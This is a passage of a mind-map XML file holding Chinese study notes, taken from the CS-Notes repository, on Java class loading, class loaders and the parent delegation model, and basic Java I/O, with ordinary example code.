      包含了加载、验证、准备、解析和初始化这 5 个阶段。
    </p>
  </body>
</html></richcontent>
<node ID="ID_601002600" CREATED="1754750650751" MODIFIED="1754750650753"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 加载
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 加载" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#1-加载">
</a>
    <p dir="auto">
      加载是类加载的一个阶段，注意不要混淆。
    </p>
    <p dir="auto">
      加载过程完成以下三件事：
    </p>
    <ul dir="auto">
      <li>
        通过类的完全限定名称获取定义该类的二进制字节流。
      </li>
      <li>
        将该字节流表示的静态存储结构转换为方法区的运行时存储结构。
      </li>
      <li>
        在内存中生成一个代表该类的 Class 对象，作为方法区中该类各种数据的访问入口。
      </li>
    </ul>
    <p dir="auto">
      其中二进制字节流可以从以下方式中获取：
    </p>
    <ul dir="auto">
      <li>
        从 ZIP 包读取，成为 JAR、EAR、WAR 格式的基础。
      </li>
      <li>
        从网络中获取，最典型的应用是 Applet。
      </li>
      <li>
        运行时计算生成，例如动态代理技术，在 java.lang.reflect.Proxy 使用 ProxyGenerator.generateProxyClass 的代理类的二进制字节流。
      </li>
      <li>
        由其他文件生成，例如由 JSP 文件生成对应的 Class 类。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_870095412" CREATED="1754750650754" MODIFIED="1754750650755"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 验证
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 验证" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#2-验证">
</a>
    <p dir="auto">
      确保 Class 文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1556855087" CREATED="1754750650755" MODIFIED="1754750650757"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 准备
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 准备" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#3-准备">
</a>
    <p dir="auto">
      类变量是被 static 修饰的变量，准备阶段为类变量分配内存并设置初始值，使用的是方法区的内存。
    </p>
    <p dir="auto">
      实例变量不会在这阶段分配内存，它会在对象实例化时随着对象一起被分配在堆中。应该注意到，实例化不是类加载的一个过程，类加载发生在所有实例化操作之前，并且类加载只进行一次，实例化可以进行多次。
    </p>
    <p dir="auto">
      初始值一般为 0 值，例如下面的类变量 value 被初始化为 0 而不是 123。
    </p>
    <pre>public static int value = 123;</pre>
    <p dir="auto">
      如果类变量是常量，那么它将初始化为表达式所定义的值而不是 0。例如下面的常量 value 被初始化为 123 而不是 0。
    </p>
    <pre>public static final int value = 123;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_84965393" CREATED="1754750650757" MODIFIED="1754750650759"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 解析
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 解析" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#4-解析">
</a>
    <p dir="auto">
      将常量池的符号引用替换为直接引用的过程。
    </p>
    <p dir="auto">
      其中解析过程在某些情况下可以在初始化阶段之后再开始，这是为了支持 Java 的动态绑定。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_613074546" CREATED="1754750650759" MODIFIED="1754750650761"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 初始化
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. 初始化" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#5-初始化">
</a>初始化阶段才真正开始执行类中定义的 Java 程序代码。初始化阶段是虚拟机执行类构造器 &lt;clinit\&gt;() 方法的过程。在准备阶段，类变量已经赋过一次系统要求的初始值，而在初始化阶段，根据程序员通过程序制定的主观计划去初始化类变量和其它资源。

    <p dir="auto">
      &lt;clinit&gt;() 是由编译器自动收集类中所有类变量的赋值动作和静态语句块中的语句合并产生的，编译器收集的顺序由语句在源文件中出现的顺序决定。特别注意的是，静态语句块只能访问到定义在它之前的类变量，定义在它之后的类变量只能赋值，不能访问。例如以下代码：
    </p>
    <pre>public class Test {
    static {
        i = 0;                // 给变量赋值可以正常编译通过
        System.out.print(i);  // 这句编译器会提示“非法向前引用”
    }
    static int i = 1;
}</pre>
    <p dir="auto">
      由于父类的 &lt;clinit&gt;() 方法先执行，也就意味着父类中定义的静态语句块的执行要优先于子类。例如以下代码：
    </p>
    <pre>static class Parent {
    public static int A = 1;
    static {
        A = 2;
    }
}
static class Sub extends Parent {
    public static int B = A;
}
public static void main(String[] args) {
     System.out.println(Sub.B);  // 2
}</pre>
    <p dir="auto">
      接口中不可以使用静态语句块，但仍然有类变量初始化的赋值操作，因此接口与类一样都会生成 &lt;clinit&gt;() 方法。但接口与类不同的是，执行接口的 &lt;clinit&gt;() 方法不需要先执行父接口的 &lt;clinit&gt;() 方法。只有当父接口中定义的变量使用时，父接口才会初始化。另外，接口的实现类在初始化时也一样不会执行接口的 &lt;clinit&gt;() 方法。
    </p>
    <p dir="auto">
      虚拟机会保证一个类的 &lt;clinit&gt;() 方法在多线程环境下被正确的加锁和同步，如果多个线程同时初始化一个类，只会有一个线程执行这个类的 &lt;clinit&gt;() 方法，其它线程都会阻塞等待，直到活动线程执行 &lt;clinit&gt;() 方法完毕。如果在一个类的 &lt;clinit&gt;() 方法中有耗时的操作，就可能造成多个线程阻塞，在实际过程中此种阻塞很隐蔽。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_641050316" CREATED="1754750650762" MODIFIED="1754750650762"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      类初始化时机
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_378558106" CREATED="1754750650763" MODIFIED="1754750650765"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 主动引用
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 主动引用" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#1-主动引用">
</a>
    <p dir="auto">
      虚拟机规范中并没有强制约束何时进行加载，但是规范严格规定了有且只有下列五种情况必须对类进行初始化（加载、验证、准备都会随之发生）：
    </p>
    <ul dir="auto">
      <li>
        <p dir="auto">
          遇到 new、getstatic、putstatic、invokestatic 这四条字节码指令时，如果类没有进行过初始化，则必须先触发其初始化。最常见的生成这 4 条指令的场景是：使用 new 关键字实例化对象的时候；读取或设置一个类的静态字段（被 final 修饰、已在编译期把结果放入常量池的静态字段除外）的时候；以及调用一个类的静态方法的时候。
        </p>
      </li>
      <li>
        <p dir="auto">
          使用 java.lang.reflect 包的方法对类进行反射调用的时候，如果类没有进行初始化，则需要先触发其初始化。
        </p>
      </li>
      <li>
        <p dir="auto">
          当初始化一个类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化。
        </p>
      </li>
      <li>
        <p dir="auto">
          当虚拟机启动时，用户需要指定一个要执行的主类（包含 main() 方法的那个类），虚拟机会先初始化这个主类；
        </p>
      </li>
      <li>
        <p dir="auto">
          当使用 JDK 1.7 的动态语言支持时，如果一个 java.lang.invoke.MethodHandle 实例最后的解析结果为 REF_getStatic, REF_putStatic, REF_invokeStatic 的方法句柄，并且这个方法句柄所对应的类没有进行过初始化，则需要先触发其初始化；
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1970726689" CREATED="1754750650765" MODIFIED="1754750650767"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 被动引用
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 被动引用" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#2-被动引用">
</a>
    <p dir="auto">
      以上 5 种场景中的行为称为对一个类进行主动引用。除此之外，所有引用类的方式都不会触发初始化，称为被动引用。被动引用的常见例子包括：
    </p>
    <ul dir="auto">
      <li>
        通过子类引用父类的静态字段，不会导致子类初始化。
      </li>
    </ul>
    <pre>System.out.println(SubClass.value);  // value 字段在 SuperClass 中定义</pre>
    <ul dir="auto">
      <li>
        通过数组定义来引用类，不会触发此类的初始化。该过程会对数组类进行初始化，数组类是一个由虚拟机自动生成的、直接继承自 Object 的子类，其中包含了数组的属性和方法。
      </li>
    </ul>
    <pre>SuperClass[] sca = new SuperClass[10];</pre>
    <ul dir="auto">
      <li>
        常量在编译阶段会存入调用类的常量池中，本质上并没有直接引用到定义常量的类，因此不会触发定义常量的类的初始化。
      </li>
    </ul>
    <pre>System.out.println(ConstClass.HELLOWORLD);</pre>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_814432663" CREATED="1754750650767" MODIFIED="1754750650769"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      类与类加载器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 类与类加载器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#类与类加载器">
</a>
    <p dir="auto">
      两个类相等，需要类本身相等，并且使用同一个类加载器进行加载。这是因为每一个类加载器都拥有一个独立的类名称空间。
    </p>
    <p dir="auto">
      这里的相等，包括类的 Class 对象的 equals() 方法、isAssignableFrom() 方法、isInstance() 方法的返回结果为 true，也包括使用 instanceof 关键字做对象所属关系判定结果为 true。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1864321146" CREATED="1754750650769" MODIFIED="1754750650771"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      类加载器分类
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 类加载器分类" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#类加载器分类">
</a>
    <p dir="auto">
      从 Java 虚拟机的角度来讲，只存在以下两种不同的类加载器：
    </p>
    <ul dir="auto">
      <li>
        <p dir="auto">
          启动类加载器（Bootstrap ClassLoader），使用 C++ 实现，是虚拟机自身的一部分；
        </p>
      </li>
      <li>
        <p dir="auto">
          所有其它类的加载器，使用 Java 实现，独立于虚拟机，继承自抽象类 java.lang.ClassLoader。
        </p>
      </li>
    </ul>
    <p dir="auto">
      从 Java 开发人员的角度看，类加载器可以划分得更细致一些：
    </p>
    <ul dir="auto">
      <li>
        <p dir="auto">
          启动类加载器（Bootstrap ClassLoader）此类加载器负责将存放在 &lt;JRE_HOME&gt;\lib 目录中的，或者被 -Xbootclasspath 参数所指定的路径中的，并且是虚拟机识别的（仅按照文件名识别，如 rt.jar，名字不符合的类库即使放在 lib 目录中也不会被加载）类库加载到虚拟机内存中。启动类加载器无法被 Java 程序直接引用，用户在编写自定义类加载器时，如果需要把加载请求委派给启动类加载器，直接使用 null 代替即可。
        </p>
      </li>
      <li>
        <p dir="auto">
          扩展类加载器（Extension ClassLoader）这个类加载器是由 ExtClassLoader（sun.misc.Launcher$ExtClassLoader）实现的。它负责将 &lt;JAVA_HOME&gt;/lib/ext 或者被 java.ext.dir 系统变量所指定路径中的所有类库加载到内存中，开发者可以直接使用扩展类加载器。
        </p>
      </li>
      <li>
        <p dir="auto">
          应用程序类加载器（Application ClassLoader）这个类加载器是由 AppClassLoader（sun.misc.Launcher$AppClassLoader）实现的。由于这个类加载器是 ClassLoader 中的 getSystemClassLoader() 方法的返回值，因此一般称为系统类加载器。它负责加载用户类路径（ClassPath）上所指定的类库，开发者可以直接使用这个类加载器，如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_720491029" CREATED="1754750650771" MODIFIED="1754750650773"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      双亲委派模型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 双亲委派模型" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#双亲委派模型">
</a>
    <p dir="auto">
      应用程序是由三种类加载器互相配合从而实现类加载，除此之外还可以加入自己定义的类加载器。
    </p>
    <p dir="auto">
      下图展示了类加载器之间的层次关系，称为双亲委派模型（Parents Delegation Model）。该模型要求除了顶层的启动类加载器外，其它的类加载器都要有自己的父类加载器。这里的父子关系一般通过组合关系（Composition）来实现，而不是继承关系（Inheritance）。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/816088b993d651e0924f066587362f61c61d3687728d2af27c35907eaf7b3c7f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30646432643430612d356232622d346434352d623137362d6537356134636434626462662e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/816088b993d651e0924f066587362f61c61d3687728d2af27c35907eaf7b3c7f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30646432643430612d356232622d346434352d623137362d6537356134636434626462662e706e67" width="500px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0dd2d40a-5b2b-4d45-b176-e75a4cd4bdbf.png"/>
    </a><br/>
  </body>
</html></richcontent>
<node ID="ID_1083665726" CREATED="1754750650773" MODIFIED="1754750650774"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 工作过程
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 工作过程" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#1-工作过程">
</a>
    <p dir="auto">
      一个类加载器首先将类加载请求转发到父类加载器，只有当父类加载器无法完成时才尝试自己加载。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_227687593" CREATED="1754750650775" MODIFIED="1754750650776"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 好处
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 好处" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#2-好处">
</a>
    <p dir="auto">
      使得 Java 类随着它的类加载器一起具有一种带有优先级的层次关系，从而使得基础类得到统一。
    </p>
    <p dir="auto">
      例如 java.lang.Object 存放在 rt.jar 中，如果编写另外一个 java.lang.Object 并放到 ClassPath 中，程序可以编译通过。由于双亲委派模型的存在，所以在 rt.jar 中的 Object 比在 ClassPath 中的 Object 优先级更高，这是因为 rt.jar 中的 Object 使用的是启动类加载器，而 ClassPath 中的 Object 使用的是应用程序类加载器。rt.jar 中的 Object 优先级更高，那么程序中所有的 Object 都是这个 Object。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_287448989" CREATED="1754750650777" MODIFIED="1754750650779"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 实现
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 实现" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#3-实现">
</a>
    <p dir="auto">
      以下是抽象类 java.lang.ClassLoader 的代码片段，其中的 loadClass() 方法运行过程如下：先检查类是否已经加载过，如果没有则让父类加载器去加载。当父类加载器加载失败时抛出 ClassNotFoundException，此时尝试自己去加载。
    </p>
    <pre>public abstract class ClassLoader {
    // The parent class loader for delegation
    private final ClassLoader parent;
    public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException {
        return loadClass(name, false);
    }
    protected Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException {
        synchronized (getClassLoadingLock(name)) {
            // First, check if the class has already been loaded
            Class&lt;?&gt; c = findLoadedClass(name);
            if (c == null) {
                try {
                    if (parent != null) {
                        c = parent.loadClass(name, false);
                    } else {
                        c = findBootstrapClassOrNull(name);
                    }
                } catch (ClassNotFoundException e) {
                    // ClassNotFoundException thrown if class not found
                    // from the non-null parent class loader
                }
                if (c == null) {
                    // If still not found, then invoke findClass in order
                    // to find the class.
                    c = findClass(name);
                }
            }
            if (resolve) {
                resolveClass(c);
            }
            return c;
        }
    }
    protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {
        throw new ClassNotFoundException(name);
    }
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_911844816" CREATED="1754750650779" MODIFIED="1754750650781"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      自定义类加载器实现
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 自定义类加载器实现" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#自定义类加载器实现">
</a>
    <p dir="auto">
      以下代码中的 FileSystemClassLoader 是自定义类加载器，继承自 java.lang.ClassLoader，用于加载文件系统上的类。它首先根据类的全名在文件系统上查找类的字节代码文件（.class 文件），然后读取该文件内容，最后通过 defineClass() 方法来把这些字节代码转换成 java.lang.Class 类的实例。
    </p>
    <p dir="auto">
      java.lang.ClassLoader 的 loadClass() 实现了双亲委派模型的逻辑，自定义类加载器一般不去重写它，但是需要重写 findClass() 方法。
    </p>
    <pre>public class FileSystemClassLoader extends ClassLoader {
    private String rootDir;
    public FileSystemClassLoader(String rootDir) {
        this.rootDir = rootDir;
    }
    protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {
        byte[] classData = getClassData(name);
        if (classData == null) {
            throw new ClassNotFoundException();
        } else {
            return defineClass(name, classData, 0, classData.length);
        }
    }
    private byte[] getClassData(String className) {
        String path = classNameToPath(className);
        try {
            InputStream ins = new FileInputStream(path);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            int bufferSize = 4096;
            byte[] buffer = new byte[bufferSize];
            int bytesNumRead;
            while ((bytesNumRead = ins.read(buffer)) != -1) {
                baos.write(buffer, 0, bytesNumRead);
            }
            return baos.toByteArray();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
    private String classNameToPath(String className) {
        return rootDir + File.separatorChar
                + className.replace('.', File.separatorChar) + &quot;.class&quot;;
    }
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_45613359" CREATED="1754750650781" MODIFIED="1754750650783"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        周志明. 深入理解 Java 虚拟机 [M]. 机械工业出版社, 2011.
      </li>
      <li>
        <a href="https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-2.html#jvms-2.5.4" rel="nofollow">Chapter 2. The Structure of the Java Virtual Machine</a>
      </li>
      <li>
        <a href="https://www.slideshare.net/benewu/jvm-memory" rel="nofollow">Jvm memory</a>&#xa0;<a href="http://www.oracle.com/webfolder/technetwork/tutorials/obe/java/G1GettingStarted/index.html" rel="nofollow">Getting Started with the G1 Garbage Collector</a>
      </li>
      <li>
        <a href="http://electrofriends.com/articles/jni/jni-part1-java-native-interface/" rel="nofollow">JNI Part1: Java Native Interface Introduction and “Hello World” application</a>
      </li>
      <li>
        <a href="https://hackthejava.wordpress.com/2015/01/09/memory-architecture-by-jvmruntime-data-areas/" rel="nofollow">Memory Architecture Of JVM(Runtime Data Areas)</a>
      </li>
      <li>
        <a href="https://www.programcreek.com/2013/04/jvm-run-time-data-areas/" rel="nofollow">JVM Run-Time Data Areas</a>
      </li>
      <li>
        <a href="http://www.drdobbs.com/architecture-and-design/android-on-x86-java-native-interface-and/240166271" rel="nofollow">Android on x86: Java Native Interface and the Android Native Development Kit</a>
      </li>
      <li>
        <a href="https://crowhawk.github.io/2017/08/10/jvm_2/" rel="nofollow">深入理解 JVM(2)——GC 算法与内存分配策略</a>
      </li>
      <li>
        <a href="https://crowhawk.github.io/2017/08/15/jvm_3/" rel="nofollow">深入理解 JVM(3)——7 种垃圾收集器</a>
      </li>
      <li>
        <a href="http://blog.jamesdbloom.com/JVMInternals.html" rel="nofollow">JVM Internals</a>
      </li>
      <li>
        <a href="https://www.ibm.com/developerworks/cn/java/j-lo-classloader/index.html#code6" rel="nofollow">深入探讨 Java 类加载器</a>
      </li>
      <li>
        <a href="http://www.baeldung.com/java-weakhashmap" rel="nofollow">Guide to WeakHashMap in Java</a>
      </li>
      <li>
        <a href="https://alvinalexander.com/java/jwarehouse/apache-tomcat-6.0.16/java/org/apache/el/util/ConcurrentCache.java.shtml" rel="nofollow">Tomcat example source code file (ConcurrentCache.java)</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_305690697" CREATED="1754749807841" MODIFIED="1754750672562" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Java I/O
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1475094907" CREATED="1754750650786" MODIFIED="1754750650787"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、概览
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 一、概览" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#一概览">
</a>
    <p dir="auto">
      Java 的 I/O 大概可以分成以下几类：
    </p>
    <ul dir="auto">
      <li>
        磁盘操作：File
      </li>
      <li>
        字节操作：InputStream 和 OutputStream
      </li>
      <li>
        字符操作：Reader 和 Writer
      </li>
      <li>
        对象操作：Serializable
      </li>
      <li>
        网络操作：Socket
      </li>
      <li>
        新的输入/输出：NIO
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_840349085" CREATED="1754750650788" MODIFIED="1754750650789"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、磁盘操作
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二、磁盘操作" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#二磁盘操作">
</a>
    <p dir="auto">
      File 类可以用于表示文件和目录的信息，但是它不表示文件的内容。
    </p>
    <p dir="auto">
      递归地列出一个目录下所有文件：
    </p>
    <pre>public static void listAllFiles(File dir) {
    if (dir == null || !dir.exists()) {
        return;
    }
    if (dir.isFile()) {
        System.out.println(dir.getName());
        return;
    }
    for (File file : dir.listFiles()) {
        listAllFiles(file);
    }
}</pre>
    <p dir="auto">
      从 Java7 开始，可以使用 Paths 和 Files 代替 File。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_550347787" CREATED="1754750650790" MODIFIED="1754750650790"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、字节操作
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1081011396" CREATED="1754750650791" MODIFIED="1754750650792"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      实现文件复制
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 实现文件复制" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#实现文件复制">
</a>
    <pre>public static void copyFile(String src, String dist) throws IOException {
    FileInputStream in = new FileInputStream(src);
    FileOutputStream out = new FileOutputStream(dist);
    byte[] buffer = new byte[20 * 1024];
    int cnt;
    // read() 最多读取 buffer.length 个字节
    // 返回的是实际读取的个数
    // 返回 -1 的时候表示读到 eof，即文件尾
    while ((cnt = in.read(buffer, 0, buffer.length)) != -1) {
        out.write(buffer, 0, cnt);
    }
    in.close();
    out.close();
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1205626442" CREATED="1754750650793" MODIFIED="1754750650795"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      装饰者模式
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 装饰者模式" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#装饰者模式">
</a>
    <p dir="auto">
      Java I/O 使用了装饰者模式来实现。以 InputStream 为例，
    </p>
    <ul dir="auto">
      <li>
        InputStream 是抽象组件；
      </li>
      <li>
        FileInputStream 是 InputStream 的子类，属于具体组件，提供了字节流的输入操作；
      </li>
      <li>
        FilterInputStream 属于抽象装饰者，装饰者用于装饰组件，为组件提供额外的功能。例如 BufferedInputStream 为 FileInputStream 提供缓存的功能。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fcde77c630c18722c8df063d1dcafddd69a452a195ca16a9eec34d830eefc341/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39373039363934622d646230352d346363652d386432662d3163386230396634643932312e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/fcde77c630c18722c8df063d1dcafddd69a452a195ca16a9eec34d830eefc341/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39373039363934622d646230352d346363652d386432662d3163386230396634643932312e706e67" width="650px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9709694b-db05-4cce-8d2f-1c8b09f4d921.png"/>
    </a><br/>
    

    <p dir="auto">
      实例化一个具有缓存功能的字节流对象时，只需要在 FileInputStream 对象上再套一层 BufferedInputStream 对象即可。
    </p>
    <pre>FileInputStream fileInputStream = new FileInputStream(filePath);
BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream);</pre>
    <p dir="auto">
      DataInputStream 装饰者提供了对更多数据类型进行输入的操作，比如 int、double 等基本类型。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1281968464" CREATED="1754750650795" MODIFIED="1754750650795"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、字符操作
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_617797996" CREATED="1754750650796" MODIFIED="1754750650798"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      编码与解码
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 编码与解码" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md#编码与解码">
</a>
    <p dir="auto">
      编码就是把字符转换为字节，而解码是把字节重新组合成字符。
    </p>
    <p dir="auto">
      如果编码和解码过程使用不同的编码方式那么就出现了乱码。
    </p>
    <ul dir="auto">
      <li>
        GBK 编码中，中文字符占 2 个字节，英文字符占 1 个字节；
      </li>
      <li>
        UTF-8 编码中，中文字符占 3 个字节，英文字符占 1 个字节；
      </li>
      <li>
        UTF-16be 编码中，中文字符和英文字符都占 2 个字节。
      </li>
    </ul>
    <p dir="auto">
      UTF-16be 中的 be 指的是 Big Endian，也就是大端。相应地也有 UTF-16le，le 指的是 Little Endian，也就是小端。
    </p>
    <p dir="auto">
      Java 的内存编码使用双字节编码 UTF-16be，这不是指 Java 只支持这一种编码方式，而是说 char 这种类型使用 UTF-16be 进行编码。char 类型占 16 位，也就是两个字节，Java 使用这种双字节编码是为了让一个中文或者一个英文都能使用一个 char 来存储。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1314888454" CREATED="1754750650798" MODIFIED="1754750650799"><richcontent TYPE="NODE">

<html>
